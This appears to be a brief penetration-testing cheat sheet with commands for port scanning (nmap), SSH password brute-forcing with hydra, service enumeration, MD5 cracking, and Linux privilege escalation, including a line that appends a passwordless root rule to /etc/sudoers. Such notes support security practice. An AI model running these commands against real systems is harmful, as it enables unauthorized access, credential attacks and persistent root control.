## ENUMERATION

### Find all open ports
```
nmap -sV -Pn -p- -T4 -A <IP>
nmap -Pn -sT -sV -A --script=default,banner -p- <IP>
```
### Password bruteforce using hydra
```
hydra -l bob -p password ssh://10.10.10.1 -t 4
hydra -L user.txt -P pass.txt ssh://10.10.10.1 -t 4
```

### linux enumeration 
```
enum4linux <IP>
```

### enumerate port 80
```
nikto -host http://<IP>
```
## ENCRYPTIONS AND DECRYPTIONS

### Online md5 cracker
```
https://www.md5online.org/md5-decrypt.html
```

## PRIVILAGE ESCALATION

### Linux

### First do some privilage checking
```
http://www.securitysift.com/download/linuxprivchecker.py
```

### if you can edit sudoers file, just add this line
```
echo 'bob ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```
